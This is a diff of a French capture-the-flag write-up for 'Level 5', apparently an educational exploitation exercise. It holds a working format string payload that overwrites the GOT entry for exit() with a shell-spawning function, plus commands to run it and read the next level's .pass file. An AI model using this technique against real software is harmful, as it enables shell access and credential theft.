@@ -1,48 +1,99 @@
-on tombe sur 2 fonction o() et n()
-o() contient l'execution d'un shell donc il faut trouver le moyen de l'executer
+### Level 5
 
-on vas s'appuyer sur la fonction exit() dans la fonction n()
-on sait qu'il y a un tableau de fonction nommer GOT qui contient les adresse reelle des fonctions externes
+#### Etape 01 :
 
-on voit que la meme faille qu'au niveau precedent est presente printf() passe directement une variable d'entrer on va s'appuyer
-dessus pour reecrire dans GOT l'adresse qui est cense mene vers le exit() externe pour rediriger plutot vers o()
+On identifie deux fonctions importantes : `n()` et `o()`.
 
-objdump -R level5 | grep exit pour trouver l'adresse de exit dans GOT
+- `o()` execute un shell.
+- `n()` se termine par un `exit()`.
 
+L'idee est donc de detourner l'appel a `exit()` dans `n()` pour executer `o()` a la place.
+
+#### Etape 02 :
+
+Comme au niveau precedent, il y a une faille de format string avec `printf(buffer)`.
+On va s'en servir pour ecrire dans la GOT (Global Offset Table), qui contient les adresses reelles des fonctions externes.
+
+Objectif : remplacer l'entree GOT de `exit` par l'adresse de `o`.
+
+#### Etape 03 :
+
+On recupere l'adresse de `exit` dans la GOT :
+
+```bash
+objdump -R level5 | grep exit
+```
+
+Resultat :
+
+```text
 08049828 R_386_JUMP_SLOT   _exit
 08049838 R_386_JUMP_SLOT   exit
+```
 
+Adresse cible a ecraser (celle d'`exit()` dans GOT) : `0x08049838`.
 
-(gdb) info function o pour trouver l'adresse de o()
+#### Etape 04 :
 
-0x080483c0  __gmon_start__
-0x080483c0  __gmon_start__@plt
-0x08048420  __do_global_dtors_aux
+On recupere l'adresse de la fonction `o` :
+
+```bash
+gdb -q ./level5
+(gdb) info function o
+```
+
+Extrait utile :
+
+```text
 0x080484a4  o
-0x080485a0  __do_global_ctors_aux
+```
 
-on a donc l'adresse de exit() dans GOT et o() :
-exit = 08049838
-o = 0x080484a4
+Adresse a ecrire dans GOT (celle de `o()`) : `0x080484a4`.
 
+#### Etape 05 :
+
+On determine la position de notre buffer dans la stack :
+
+```bash
 python -c 'print "eeee %x %x %x %x"' | ./level5
+```
 
+Sortie observee :
+
+```text
 eeee 200 b7fd1ac0 b7ff37d0 65656565
+```
 
-on voit que le printf stock le buffer a la 4eme place de la stack
+`65656565` correspond a `eeee`, donc notre buffer est au 4e argument (`%4$...`).
 
-on converti l'adresse de o en decimal
+#### Etape 06 :
 
+On convertit l'adresse de `o` en decimal pour preparer `%n` :
+
+```text
 0x080484a4 = 134513828
+```
 
-nous avons tout en main pour construire le payload
+On place l'adresse GOT de `exit` au debut, puis on complete jusqu'au bon nombre de caracteres, et enfin `%4$n` ecrit la valeur a cette adresse.
 
-Donc on reecrit l'adresse de exit dans GOT pour qu'elle pointe vers la fonction o
+Payload :
 
-python -c 'print ("\x38\x98\x04\x08" + "%134513824d%4$n")' > /tmp/payload
+```bash
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload
+```
 
-cat /tmp/exploit - | ./level5
+(`134513824` car les 4 octets d'adresse sont deja imprimes)
 
-le shell est execute
+#### Etape 07 :
 
+Execution de l'exploit :
+
+```bash
+cat /tmp/payload - | ./level5
+```
+
+Le shell est execute, puis on peut lire le mot de passe du niveau suivant :
+
+```bash
 cat /home/user/level6/.pass
+```
